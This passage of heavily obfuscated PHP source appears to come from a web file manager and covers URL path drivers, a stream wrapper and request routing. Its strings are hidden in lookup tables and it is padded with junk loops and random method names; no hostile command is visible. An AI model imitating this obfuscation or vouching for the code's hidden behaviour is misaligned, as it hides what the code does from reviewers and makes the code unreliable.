$this->pathThis($ƒ¼˜«¦ı); } $ÖÌçİĞ— = $Ğä†áÎå ? array($_SERVER[¹Û¹Æ€][1498] . rawurlencode($‚‹ÜÉ…)) : array(); $ëåå¨Şó = $this->link($ƒ¼˜«¦ı, $ÖÌçİĞ—); $this->fileOutLink($ëåå¨Şó); } public function fileOutServer($ÓóÈÆö«, $˜«™üü = false, $¡ïŠì¬° = false, $ÙÂÂíÉ = '') { parent::fileOut($ÓóÈÆö«, $˜«™üü, $¡ïŠì¬°, $ÙÂÂíÉ); } public function fileOutImage($„á‡ìò‡, $åë²Î¤Ñ = 250) { $†¨¯ÉŠÍ = $this->link($„á‡ìò‡ . $_SERVER[¹Û¹Æ€][1499] . $åë²Î¤Ñ); $this->fileOutLink($†¨¯ÉŠÍ); } public function fileOutImageServer($³ëê»ë€, $¡Ÿ©…Ñ¾ = 250) { parent::fileOutImage($³ëê»ë€, $¡Ÿ©…Ñ¾); } public function hashMd5($–†òøİü) { $ÑÃÂ¶Ä =& $_SERVER[¹Û¹Æ€]; $Óòªãíö = $this->_objectMeta($–†òøİü); return isset($Óòªãíö[$ÑÃÂ¶Ä[222]]) ? $Óòªãíö[$ÑÃÂ¶Ä[222]] : !1; } public function size($¿ÌËÏƒû) { $ÛòÖ²Ä = $this->objectMeta($¿ÌËÏƒû); return $ÛòÖ²Ä ? $ÛòÖ²Ä[$_SERVER[¹Û¹Æ€][86]] : 0; } public function info($ éœ®²¶) { if ($this->isFolder($ éœ®²¶)) { return $this->folderInfo($ éœ®²¶); } else { if ($this->isFile($ éœ®²¶)) { return $this->fileInfo($ éœ®²¶); } } return !1; } public function exist($£µİâñö) { return $this->isFile($£µİâñö) || $this->isFolder($£µİâñö); } public function isFile($›ï€å’§) { return !$this->isFolder($›ï€å’§) && $this->objectMeta($›ï€å’§); } public function isFolder($Ìœáã’) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][175], $Ìœáã’); } protected function objectMeta($çŸÀœâ) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][177], $çŸÀœâ); } protected function _objectMeta($ı´àÁíù) { $ˆ‰ñ™À± =& $_SERVER[¹Û¹Æ€]; if ($ı´àÁíù == $ˆ‰ñ™À±[22] || $ı´àÁíù == $ˆ‰ñ™À±[18]) { return array(); } $›ÔòœÔœ = $this->ussRequest($ı´àÁíù, $ˆ‰ñ™À±[1500]); if (!$›ÔòœÔœ[$ˆ‰ñ™À±[1210]]) { return null; } $Áë½¼Øä = isset($›ÔòœÔœ[$ˆ‰ñ™À±[1200]]) ? $›ÔòœÔœ[$ˆ‰ñ™À±[1200]] : array(); if (!isset($Áë½¼Øä[$ˆ‰ñ™À±[1501]])) { return null; } $—ê±á©Ò = array($ˆ‰ñ™À±[43] => isset($Áë½¼Øä[$ˆ‰ñ™À±[1501]]) ? $Áë½¼Øä[$ˆ‰ñ™À±[1501]] : null, $ˆ‰ñ™À±[86] => isset($Áë½¼Øä[$ˆ‰ñ™À±[1502]]) ? $Áë½¼Øä[$ˆ‰ñ™À±[1502]] : null, $ˆ‰ñ™À±[222] => isset($Áë½¼Øä[$ˆ‰ñ™À±[1503]]) ? $Áë½¼Øä[$ˆ‰ñ™À±[1503]] : null, $ˆ‰ñ™À±[1470] => isset($Áë½¼Øä[$ˆ‰ñ™À±[1504]]) ? $Áë½¼Øä[$ˆ‰ñ™À±[1504]] : null); $—ê±á©Ò[$ˆ‰ñ™À±[1471]] = isset($Áë½¼Øä[$ˆ‰ñ™À±[1505]]) ? strtotime($Áë½¼Øä[$ˆ‰ñ™À±[1505]]) : $—ê±á©Ò[$ˆ‰ñ™À±[1470]]; return $—ê±á©Ò; } protected function _isFolder($¼‹±ÔÂ) { $‡îãòª =& $_SERVER[¹Û¹Æ€]; if ($¼‹±ÔÂ == $‡îãòª[22] || $¼‹±ÔÂ == $‡îãòª[18]) { return !0; } $¡®Ëå•ã = $this->_objectMeta($¼‹±ÔÂ); return isset($¡®Ëå•ã[$‡îãòª[43]]) && $¡®Ëå•ã[$‡îãòª[43]] == $‡îãòª[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($•Ûö¨íÍ = false) { } public function exist($§ƒÍ•Ñí) { $ÕÃûÈí’ = $this->info($§ƒÍ•Ñí); return $ÕÃûÈí’[$_SERVER[¹Û¹Æ€][211]]; } public function isFile($ƒÅÖ†¼) { $ãş”¤‚Š = $this->info($ƒÅÖ†¼); return $ãş”¤‚Š[$_SERVER[¹Û¹Æ€][211]]; } public function isFolder($öÉ¶ì) { return !1; } public function size($Ê¯ÄÊºë) { $ËŸ·×çÂ = $this->info($Ê¯ÄÊºë); return $ËŸ·×çÂ[$_SERVER[¹Û¹Æ€][86]]; } public function info($½ÔÄÍà) { return $this->infoParse($½ÔÄÍà); } public function infoAuth($‘şÌ°) { return $this->infoParse($‘şÌ°); } public function infoWithChildren($ª³—è§) { return $this->infoParse($ª³—è§); } public function infoFull($¥™¥öÈ½) { return $this->infoParse($¥™¥öÈ½); } private function infoParse($ÜÖÁ—ö) { $¸—²ıİ =& $_SERVER[¹Û¹Æ€]; $çø‹ÌÃ• = $this->header($ÜÖÁ—ö); if (!$çø‹ÌÃ• || !$çø‹ÌÃ•[$¸—²ıİ[748]]) { return !1; } $˜§ÚÛß = _get($çø‹ÌÃ•, $¸—²ıİ[346], 0); $¯²¦™ÌÜ = array($¸—²ıİ[42] => $çø‹ÌÃ•[$¸—²ıİ[42]], $¸—²ıİ[94] => $ÜÖÁ—ö, $¸—²ıİ[43] => $¸—²ıİ[209], $¸—²ıİ[86] => intval($˜§ÚÛß), $¸—²ıİ[184] => get_path_ext($çø‹ÌÃ•[$¸—²ıİ[42]]), $¸—²ıİ[1384] => $˜§ÚÛß > 0 && $çø‹ÌÃ•[$¸—²ıİ[1506]], $¸—²ıİ[1385] => !1); return $¯²¦™ÌÜ; } private function header($øæ¡‚Ù¸) { $÷°‘ş«Ü =& $_SERVER[¹Û¹Æ€]; if (isset(self::$_cacheHeader[$øæ¡‚Ù¸])) { return self::$_cacheHeader[$øæ¡‚Ù¸]; } $æ”ŸÕîÉ = isset($GLOBALS[$÷°‘ş«Ü[1507]]) ? $GLOBALS[$÷°‘ş«Ü[1507]] : !1; $GLOBALS[$÷°‘ş«Ü[1507]] = !0; self::$_cacheHeader[$øæ¡‚Ù¸] = url_header($øæ¡‚Ù¸); $GLOBALS[$÷°‘ş«Ü[1507]] = $æ”ŸÕîÉ; return self::$_cacheHeader[$øæ¡‚Ù¸]; } public function hashSimple($Ï·›µú, $’ìœÆÀ = false) { $‹ş½æ‚í =& $_SERVER[¹Û¹Æ€]; $ãŸâÛÉ‹ = $this->info($Ï·›µú); if (!$ãŸâÛÉ‹ || !$ãŸâÛÉ‹[$‹ş½æ‚í[211]]) { return !1; } $¶—›àıÇ = $ãŸâÛÉ‹[$‹ş½æ‚í[86]]; $ø¼ß¿Â‰ = 200; $¸ì’ß÷ = 50; if ($¶—›àıÇ <= $ø¼ß¿Â‰ * $¸ì’ß÷) { return md5($this->fileSubstr($Ï·›µú, 0, $¶—›àıÇ)) . $¶—›àıÇ; } $‹îˆÍŸ… = intval($¶—›àıÇ / $¸ì’ß÷); $©ı¤ÓÁı = $‹ş½æ‚í[22]; $§ÚªßÉª = timeFloat(); $Äá¾ğÉò = 15; for ($ıÒ¯œÚØ = 0; $ıÒ¯œÚØ < $¸ì’ß÷; $ıÒ¯œÚØ++) { if (timeFloat() - $§ÚªßÉª > $Äá¾ğÉò) { return !1; } $°àè–“ë = $this->fileSubstr($Ï·›µú, $‹îˆÍŸ… * $ıÒ¯œÚØ, $ø¼ß¿Â‰); if (!$°àè–“ë) { return !1; } $©ı¤ÓÁı .= $°àè–“ë; } $©ı¤ÓÁı .= $this->fileSubstr($Ï·›µú, $¶—›àıÇ - $ø¼ß¿Â‰, $ø¼ß¿Â‰); return md5($©ı¤ÓÁı) . $¶—›àıÇ; } public function getContent($ˆêÚêà½) { return $this->fileSubstr($ˆêÚêà½); } public function fileSubstr($ŸØÏ‘®, $ĞÉÒ±Äî = 0, $õÄŒÁùÀ = -1) { $Ğƒòç€Ä =& $_SERVER[¹Û¹Æ€]; $÷ØÜ—§¶ = $this->info($ŸØÏ‘®); if (!$÷ØÜ—§¶ || !$÷ØÜ—§¶[$Ğƒòç€Ä[211]] && $÷ØÜ—§¶[$Ğƒòç€Ä[86]] > 1024 * 1024 * 10) { return !1; } if ($õÄŒÁùÀ === -1) { $õÄŒÁùÀ = $÷ØÜ—§¶[$Ğƒòç€Ä[86]]; } if ($õÄŒÁùÀ == 0) { return $Ğƒòç€Ä[22]; } $¥§˜æ£ó = array($Ğƒòç€Ä[1508] . $ĞÉÒ±Äî . $Ğƒòç€Ä[780] . ($ĞÉÒ±Äî + $õÄŒÁùÀ - 1)); $¸›•˜àä = url_request($ŸØÏ‘®, $Ğƒòç€Ä[240], !1, $¥§˜æ£ó, !1, !1, 30); return $¸›•˜àä[$Ğƒòç€Ä[1200]] ? $¸›•˜àä[$Ğƒòç€Ä[1200]] : $Ğƒòç€Ä[22]; } public function download($ë·¢ôÙ, $£Ä±„ û) { Downloader::start($ë·¢ôÙ, $£Ä±„ û); return $£Ä±„ û; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ö¨×æ¬”, $ê‚‰›Òë = '') { $this->info = $this->info($Ö¨×æ¬”); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹Û¹Æ€][94]]; $this->pathOpen = $Ö¨×æ¬”; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ö¨×æ¬”])) { self::$_chunkBuffer[$Ö¨×æ¬”] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($«×å¬¶é) { $É»àıã¦ = $this->fileSubstr($this->pose, $«×å¬¶é); $this->pose += strlen($É»àıã¦); return $É»àıã¦; } public function stream_tell() { return $this->pose; } public function stream_seek($Øƒ¤ğÚÃ, $£ÑØŸç) { $µÇŞĞ²ö =& $_SERVER[¹Û¹Æ€]; if ($£ÑØŸç == SEEK_SET) { $this->pose = $Øƒ¤ğÚÃ; } else { if ($£ÑØŸç == SEEK_CUR) { $this->pose += $Øƒ¤ğÚÃ; } else { if ($£ÑØŸç == SEEK_END) { $this->pose = $this->info[$µÇŞĞ²ö[86]] + intval($Øƒ¤ğÚÃ); } } } if ($Øƒ¤ğÚÃ < 0) { $this->pose = $this->info[$µÇŞĞ²ö[86]] + $Øƒ¤ğÚÃ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹Û¹Æ€][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ˆ³„²ñÅ, $º´ÄûŠà) { $Üì€İÚ =& $_SERVER[¹Û¹Æ€]; $€Äí×‰» = $this->info($ˆ³„²ñÅ); return array($Üì€İÚ[1509] => 0, $Üì€İÚ[1510] => 0, $Üì€İÚ[26] => 32768 + 511, $Üì€İÚ[1511] => 0, $Üì€İÚ[1512] => 0, $Üì€İÚ[1513] => 0, $Üì€İÚ[1514] => 0, $Üì€İÚ[86] => $€Äí×‰»[$Üì€İÚ[86]], $Üì€İÚ[1515] => $€Äí×‰»[$Üì€İÚ[1383]], $Üì€İÚ[1471] => $€Äí×‰»[$Üì€İÚ[95]], $Üì€İÚ[1470] => $€Äí×‰»[$Üì€İÚ[210]], $Üì€İÚ[1516] => 0, $Üì€İÚ[1517] => 0); } static $fileInfo = array(); public function info($±ÆÌø‘™) { $×À«¬Í = $_SERVER[¹Û¹Æ€][1518]; if (isset(self::$fileInfo[$±ÆÌø‘™])) { return self::$fileInfo[$±ÆÌø‘™]; } if (substr($±ÆÌø‘™, 0, strlen($×À«¬Í)) != $×À«¬Í) { return !1; } self::$fileInfo[$±ÆÌø‘™] = IO::info(substr($±ÆÌø‘™, strlen($×À«¬Í))); return self::$fileInfo[$±ÆÌø‘™]; } public static function read($æÌ¨É§®, $¦€…Ìß, $ Áæ•É) { if (!isset(self::$_fopenCache[$æÌ¨É§®])) { $¤È¬Æ = new StreamWrapperIO(); $¤È¬Æ->stream_open($æÌ¨É§®); self::$_fopenCache[$æÌ¨É§®] = $¤È¬Æ; } $¤È¬Æ = self::$_fopenCache[$æÌ¨É§®]; return $¤È¬Æ->fileSubstr($¦€…Ìß, $ Áæ•É); } public static function _read($–„áÓĞ , $äé²ê°Ó, $ÈÆê¹×Ú) { $—½Ì–¿ =& $_SERVER[¹Û¹Æ€]; $¨ˆ÷™€¬ = fopen($–„áÓĞ , $—½Ì–¿[1387]); if (!$¨ˆ÷™€¬) { return $—½Ì–¿[22]; } $í…Õ…¹ä = 8192; fseek($¨ˆ÷™€¬, $äé²ê°Ó, SEEK_SET); $Üƒ¤ÑÍ = $—½Ì–¿[22]; $´·à¢°Ò = 0; while ($´·à¢°Ò < $ÈÆê¹×Ú) { $™½¡¢ ³ = min($í…Õ…¹ä, $ÈÆê¹×Ú - $´·à¢°Ò); $Üƒ¤ÑÍ .= fread($¨ˆ÷™€¬, $™½¡¢ ³); $´·à¢°Ò += $™½¡¢ ³; } fclose($¨ˆ÷™€¬); return $Üƒ¤ÑÍ; } public function fileSubstr($À’å‡åñ, $±²¥ı’) { $Ò¡ü¼¤ı =& $_SERVER[¹Û¹Æ€]; $„Î²¤¯‹ = $this->info[$Ò¡ü¼¤ı[86]]; $ëÓú¥º¾ = $À’å‡åñ; $ú™ÕÖ€Æ = $±²¥ı’; if ($À’å‡åñ < 0) { $À’å‡åñ = $„Î²¤¯‹ + $À’å‡åñ; } if ($±²¥ı’ === !1) { $±²¥ı’ = $„Î²¤¯‹ - $À’å‡åñ; } if ($À’å‡åñ + $±²¥ı’ > $„Î²¤¯‹) { $±²¥ı’ = $„Î²¤¯‹ - $À’å‡åñ; } if ($±²¥ı’ <= 0) { return $Ò¡ü¼¤ı[22]; } if ($À’å‡åñ < 0 || $À’å‡åñ >= $„Î²¤¯‹ || $±²¥ı’ <= 0 || $±²¥ı’ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\x65\122\145\x61\x64\40\x65\x72\x72\157\162\41\40\x73\x74\x61\162\x74\75{$À’å‡åñ}\x3b\x6c\x65\156\147\164\x68\x3d{$±²¥ı’}\x3b\40\163\151\172\145\75{$„Î²¤¯‹}\x3b"); } $„ô€“ü = 64 * 1024; $‰¦³œÓı =& self::$_chunkBuffer[$this->path]; if (!$‰¦³œÓı) { $‰¦³œÓı = array(); } $ìĞ¹øÉ³ = 0; $ÛÈºÃßİ = 0; $Ì­üÂšî = $Ò¡ü¼¤ı[22]; foreach ($‰¦³œÓı as $ìĞ¹øÉ³ => $Ì­üÂšî) { $ìĞ¹øÉ³ = intval($ìĞ¹øÉ³); $ÛÈºÃßİ = $ìĞ¹øÉ³ + strlen($Ì­üÂšî); if ($À’å‡åñ >= $ÛÈºÃßİ) { continue; } if ($À’å‡åñ >= $ìĞ¹øÉ³ && $À’å‡åñ + $±²¥ı’ <= $ÛÈºÃßİ) { return substr($Ì­üÂšî, $À’å‡åñ - $ìĞ¹øÉ³, $±²¥ı’); } break; } if (count($‰¦³œÓı) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ò¡ü¼¤ı[1519], $Ò¡ü¼¤ı[1520] . count($‰¦³œÓı) . "\73\x73\164\x61\162\164\75{$À’å‡åñ}\x2c\x6c\145\156\147\164\150\x3d{$±²¥ı’}\73\160\157\x73\145\x3a{$ìĞ¹øÉ³}\176{$ÛÈºÃßİ}"); throw new Exception($Ò¡ü¼¤ı[1521]); } $¹„¬–¿¹ = intval($À’å‡åñ / $„ô€“ü) * $„ô€“ü; $£Ùõ¡±» = ceil(($À’å‡åñ + $±²¥ı’) / $„ô€“ü) * $„ô€“ü - $¹„¬–¿¹; $£ã®ïõı = IO::fileSubstr($this->path, $¹„¬–¿¹, $£Ùõ¡±»); $‰¦³œÓı[$¹„¬–¿¹ . $Ò¡ü¼¤ı[22]] = $£ã®ïõı; ksort($‰¦³œÓı); $Ç˜­éÈ = substr($£ã®ïõı, $À’å‡åñ - $¹„¬–¿¹, $±²¥ı’); return $Ç˜­éÈ; } private function log($«í§Æ¬Ô, $„Î¼ş) { $Á€¦áÒ =& $_SERVER[¹Û¹Æ€]; $üëÜµŒ‹ = timeFloat() - $this->timeStart; write_log(sprintf($Á€¦áÒ[1522], $«í§Æ¬Ô, $this->info[$Á€¦áÒ[42]], $üëÜµŒ‹, $„Î¼ş), $Á€¦áÒ[1180]); } } goto eºŞ¦éìº±; dùÅ›˜Â: class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($ªŸØÆÀ) { $šáÓ“×ë =& $_SERVER[¹Û¹Æ€]; $ÅöƒêŞæ =& $_SERVER[Ëü‚¼ê]; $åĞ‰”Ãö = explode($ÅöƒêŞæ[0], trim($ªŸØÆÀ, $ÅöƒêŞæ[0])); $ì¾û‡ = $šáÓ“×ë[629]; $this->defaultModule = $åĞ‰”Ãö[0] ? $åĞ‰”Ãö[0] : $this->defaultModule; $›¨í“İ™ = $šáÓ“×ë[630]; $this->defaultController = $åĞ‰”Ãö[1] ? $åĞ‰”Ãö[1] : $this->defaultController; $È¸´íÌ“ = $šáÓ“×ë[631]; if (strlen($È¸´íÌ“) < $šáÓ“×ë[624]) { return; } $this->defaultAction = $åĞ‰”Ãö[2] ? $åĞ‰”Ãö[2] : $this->defaultAction; $this->orzc59746949($ÅöƒêŞæ[1], array($this, $ÅöƒêŞæ[2])); } public function appRun($¶ÍÚ±—) { $öÒŞİÈò =& $_SERVER[¹Û¹Æ€]; $şŸê“Ò =& $_SERVER[Ëü‚¼ê]; $ÁêÜ®«¦ = explode($şŸê“Ò[0], $¶ÍÚ±—); $Çå¾­œ = $öÒŞİÈò[632]; $ùÆ×¨Êœ = strtolower($ÁêÜ®«¦[0]); $§ÏŠ³’ = $öÒŞİÈò[633]; if (strlen($§ÏŠ³’) < $öÒŞİÈò[628]) { die; } $¡™—¨¨‡ = $şŸê“Ò[3]; if ($ùÆ×¨Êœ == $şŸê“Ò[4]) { $¡™—¨¨‡ = $şŸê“Ò[5]; $ÁêÜ®«¦[0] = $şŸê“Ò[6]; $ÁêÜ®«¦[1] = $ÁêÜ®«¦[1] . $şŸê“Ò[7]; $¶ÍÚ±— = join($şŸê“Ò[0], $ÁêÜ®«¦); $¶ÍÚ±— = trim($¶ÍÚ±—, $şŸê“Ò[0]); } call_user_func(array($şŸê“Ò[8], $şŸê“Ò[9]), $¡™—¨¨‡ . $şŸê“Ò[10], $¶ÍÚ±—); ActionCall($¶ÍÚ±—); $‘õãö¬ò = $öÒŞİÈò[634]; while ($‘õãö¬ò < $öÒŞİÈò[624]) { if ($‘õãö¬ò >= 0) { break; } $‘õãö¬ò++; } call_user_func(array($şŸê“Ò[8], $şŸê“Ò[9]), $¡™—¨¨‡ . $şŸê“Ò[11], $¶ÍÚ±—); $ŞğÌÕäå = $öÒŞİÈò[635]; } private function autorun() { $ÙÁ®ó˜‹ =& $_SERVER[¹Û¹Æ€]; $‚ÑšÙã =& $_SERVER[Ëü‚¼ê]; global $config; $ÔÚÌÖïü = $ÙÁ®ó˜‹[636]; while ($ÔÚÌÖïü < $ÙÁ®ó˜‹[624]) { if ($ÔÚÌÖïü >= 0) { break; } $ÔÚÌÖïü++; } if (count($config[$‚ÑšÙã[12]]) == 0) { return; } foreach ($config[$‚ÑšÙã[12]] as $šÒ•ìïº => $³¤ãÒâÇ) { $this->appRun($³¤ãÒâÇ); $´ÕÛ§Á˜ = $ÙÁ®ó˜‹[637]; if (strlen($´ÕÛ§Á˜) < $ÙÁ®ó˜‹[638]) { return; } } } private function uvnee531aa60() { $û¹´Ì£‹ =& $_SERVER[¹Û¹Æ€]; $ÄÜÅÏ» =& $_SERVER[Ëü‚¼ê]; $ô·í¥„ß = $ÄÜÅÏ»[4]; $üå–‚¾÷ = $GLOBALS[$ÄÜÅÏ»[13]][$ÄÜÅÏ»[14]][0]; if (!$üå–‚¾÷ || strlen($üå–‚¾÷) <= strlen($ô·í¥„ß)) { return; } if (strtolower(substr($üå–‚¾÷, -strlen($ô·í¥„ß))) != $ô·í¥„ß) { return; } $Šœâ—­­ = substr($üå–‚¾÷, 0, -strlen($ô·í¥„ß)); $æµœÓÑ = array($ÄÜÅÏ»[4], $Šœâ—­­); $ÕÇ¨ÓöÇ = array_slice($GLOBALS[$ÄÜÅÏ»[13]][$ÄÜÅÏ»[14]], 1); $GLOBALS[$ÄÜÅÏ»[13]][$ÄÜÅÏ»[14]] = array_merge($æµœÓÑ, $ÕÇ¨ÓöÇ); $ô·àûúù = $û¹´Ì£‹[639]; if (strlen($ô·àûúù) < $û¹´Ì£‹[13]) { die; } $GLOBALS[$ÄÜÅÏ»[13]][$ÄÜÅÏ»[15]] = implode($ÄÜÅÏ»[0], $GLOBALS[$ÄÜÅÏ»[13]][$ÄÜÅÏ»[14]]); $ÇÂÚƒ½¹ = $û¹´Ì£‹[640]; while (strlen($ÇÂÚƒ½¹) < $û¹´Ì£‹[628]) { if (!$ÇÂÚƒ½¹) { break; } $ÇÂÚƒ½¹++; } } private function cxbt77686175() { $÷ı³Ü¤ı =& $_SERVER[¹Û¹Æ€]; $¸©¼çŸ‚ =& $_SERVER[Ëü‚¼ê]; if ($GLOBALS[$¸©¼çŸ‚[13]][$¸©¼çŸ‚[15]] != $¸©¼çŸ‚[6]) { return; } $‘àè°œ‚ = $_SERVER[$¸©¼çŸ‚[16]]; $è¾’“ ¯ = $¸©¼çŸ‚[17]; $ı¤Ò¬ÙŸ = $÷ı³Ü¤ı[641]; if (!$ı¤Ò¬ÙŸ) { die; } if (!strstr($‘àè°œ‚, $è¾’“ ¯)) { return; } $Ñå«³ğå = strrpos($‘àè°œ‚, $è¾’“ ¯); $Ï…şï¥İ = substr($‘àè°œ‚, $Ñå«³ğå + strlen($è¾’“ ¯)); preg_match_all($¸©¼çŸ‚[18], $Ï…şï¥İ, $¤«ğ¹ŞŸ); $Â”æÎí = $÷ı³Ü¤ı[642]; if (!$Â”æÎí) { die; } $Ï…şï¥İ = trim($¤«ğ¹ŞŸ[0][0], $¸©¼çŸ‚[19]); $ÆŠöÄƒ¨ = $÷ı³Ü¤ı[643]; if (strlen($ÆŠöÄƒ¨) < $÷ı³Ü¤ı[624]) { die; } $GLOBALS[$¸©¼çŸ‚[13]][$¸©¼çŸ‚[14]] = explode($¸©¼çŸ‚[19], $Ï…şï¥İ); $GLOBALS[$¸©¼çŸ‚[13]][$¸©¼çŸ‚[15]] = implode($¸©¼çŸ‚[0], $GLOBALS[$¸©¼çŸ‚[13]][$¸©¼çŸ‚[14]]); $ùÇñ“‘€ = $÷ı³Ü¤ı[644]; if (!$ùÇñ“‘€) { return; } } public function run() { $â»É¸ë… =& $_SERVER[¹Û¹Æ€]; $ôšŞàÚÛ =& $_SERVER[Ëü‚¼ê]; $this->cxbt77686175(); $ñµÑøèÉ = $â»É¸ë…[645]; $this->uvnee531aa60(); $Ë§¾Ã×£ = $â»É¸ë…[646]; if (!$Ë§¾Ã×£) { return; } $÷ãéÖ¿Ì = $GLOBALS[$ôšŞàÚÛ[13]][$ôšŞàÚÛ[14]]; $ß¨šû°Ğ = $â»É¸ë…[647]; if (!$ß¨šû°Ğ) { die; } $ó†ÁÄ¼™ = $GLOBALS[$ôšŞàÚÛ[13]][$ôšŞàÚÛ[15]]; define($ôšŞàÚÛ[20], isset($÷ãéÖ¿Ì[0]) && $÷ãéÖ¿Ì[0] ? $÷ãéÖ¿Ì[0] : $this->defaultModule); define($ôšŞàÚÛ[21], isset($÷ãéÖ¿Ì[1]) && $÷ãéÖ¿Ì[0] ? $÷ãéÖ¿Ì[1] : $this->defaultController); $İÜ»¬« = $â»É¸ë…[648]; if (!$İÜ»¬«) { return; } define($ôšŞàÚÛ[22], isset($÷ãéÖ¿Ì[2]) && $÷ãéÖ¿Ì[0] ? $÷ãéÖ¿Ì[2] : $this->defaultAction); define($ôšŞàÚÛ[23], MOD . $ôšŞàÚÛ[0] . ST . $ôšŞàÚÛ[0] . ACT); $_SERVER[$ôšŞàÚÛ[24]] = strtolower(ACTION); $this->autorun(); $ç›÷úû» = $â»É¸ë…[649]; if (count($÷ãéÖ¿Ì) >= 3) { $this->appRun($ó†ÁÄ¼™); } else { $this->appRun(ACTION); } } private $syna978d2a39 = array(); private $jvir5a98833f = ''; public function nkgy2c7c8736() { $¼¾ÓÀˆŒ =& $_SERVER[¹Û¹Æ€]; $ÈÖÊß‹ˆ =& $_SERVER[Ëü‚¼ê]; $this->eqxuf51bdc19(); $this->pmhi0fbc1993(); $this->omrz6df15211(); $this->dmts7fd9ec5b(); $this->thnp3f3bb700(); $€®Ê¶ô = $¼¾ÓÀˆŒ[650]; while ($€®Ê¶ô < $¼¾ÓÀˆŒ[628]) { if ($€®Ê¶ô >= 0) { break; } $€®Ê¶ô++; } $this->qrugc20f8ead(); $íÀ‡òïå = $¼¾ÓÀˆŒ[651]; if (strlen($íÀ‡òïå) < $¼¾ÓÀˆŒ[624]) { die; } $this->zlki22d928d8(); $this->orzc59746949($ÈÖÊß‹ˆ[25], array($this, $ÈÖÊß‹ˆ[26])); $this->orzc59746949($ÈÖÊß‹ˆ[27], array($this, $ÈÖÊß‹ˆ[28])); $this->orzc59746949($ÈÖÊß‹ˆ[29], array($this, $ÈÖÊß‹ˆ[30])); $ü’Œ„¢ˆ = $¼¾ÓÀˆŒ[652]; if (!$ü’Œ„¢ˆ) { die; } $this->orzc59746949($ÈÖÊß‹ˆ[31], array($this, $ÈÖÊß‹ˆ[32])); } public function ovkf055e510b($ëÙ§¾) { $Ëçû°Ø÷ =& $_SERVER[¹Û¹Æ€]; $èş¥ÈçÉ =& $_SERVER[Ëü‚¼ê]; $äîÕÀ§ = Model($èş¥ÈçÉ[33])->get(); $üÑ‰ìíã = $Ëçû°Ø÷[653]; $ûïªŞ–÷ = array($èş¥ÈçÉ[34], $èş¥ÈçÉ[35], $èş¥ÈçÉ[36], $èş¥ÈçÉ[37], $èş¥ÈçÉ[38], $èş¥ÈçÉ[39], $èş¥ÈçÉ[40], $èş¥ÈçÉ[41], $èş¥ÈçÉ[42], $èş¥ÈçÉ[43], $èş¥ÈçÉ[44], $èş¥ÈçÉ[45], $èş¥ÈçÉ[46], $èş¥ÈçÉ[47], $èş¥ÈçÉ[48], $èş¥ÈçÉ[49], $èş¥ÈçÉ[50], $èş¥ÈçÉ[51], $èş¥ÈçÉ[52], $èş¥ÈçÉ[53], $èş¥ÈçÉ[54], $èş¥ÈçÉ[55], $èş¥ÈçÉ[56], $èş¥ÈçÉ[57], $èş¥ÈçÉ[58], $èş¥ÈçÉ[59], $èş¥ÈçÉ[60], $èş¥ÈçÉ[61], $èş¥ÈçÉ[62], $èş¥ÈçÉ[63], $èş¥ÈçÉ[64], $èş¥ÈçÉ[65], $èş¥ÈçÉ[66], $èş¥ÈçÉ[67], $èş¥ÈçÉ[68], $èş¥ÈçÉ[69], $èş¥ÈçÉ[70], $èş¥ÈçÉ[71], $èş¥ÈçÉ[72], $èş¥ÈçÉ[73], $èş¥ÈçÉ[74], $èş¥ÈçÉ[75], $èş¥ÈçÉ[76], $èş¥ÈçÉ[77], $èş¥ÈçÉ[78], $èş¥ÈçÉ[79], $èş¥ÈçÉ[80], $èş¥ÈçÉ[81], $èş¥ÈçÉ[82], $èş¥ÈçÉ[83], $èş¥ÈçÉ[84]); $‹†ºÔ…  = $Ëçû°Ø÷[654]; while (strlen($‹†ºÔ… ) < $Ëçû°Ø÷[13]) { if (!$‹†ºÔ… ) { break; } $‹†ºÔ… ++; } foreach ($ûïªŞ–÷ as $½ˆÖ¬ë) { $¸ˆŒµ¦ = $GLOBALS[$èş¥ÈçÉ[85]][$èş¥ÈçÉ[86]][$½ˆÖ¬ë]; $±•Ûàú = $Ëçû°Ø÷[655]; while ($±•Ûàú < $Ëçû°Ø÷[656]) { if ($±•Ûàú >= 0) { break; } $±•Ûàú++; } if (isset($äîÕÀ§[$½ˆÖ¬ë])) { $¸ˆŒµ¦ = $äîÕÀ§[$½ˆÖ¬ë]; } $ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$½ˆÖ¬ë] = $¸ˆŒµ¦; } $¤æî‘Óß = $ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$èş¥ÈçÉ[46]]; $›Ó­Ë„Ğ = $Ëçû°Ø÷[657]; while (strlen($›Ó­Ë„Ğ) < $Ëçû°Ø÷[656]) { if (!$›Ó­Ë„Ğ) { break; } $›Ó­Ë„Ğ++; } unset($ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[89]][$èş¥ÈçÉ[90]]); unset($ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[89]][$èş¥ÈçÉ[91]]); $Ö†šØß˜ = $Ëçû°Ø÷[658]; unset($ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$èş¥ÈçÉ[46]]); unset($ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$èş¥ÈçÉ[92]]); $ÂùÌÒã = $Ëçû°Ø÷[659]; $ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$èş¥ÈçÉ[93]] = array($èş¥ÈçÉ[94] => (int) 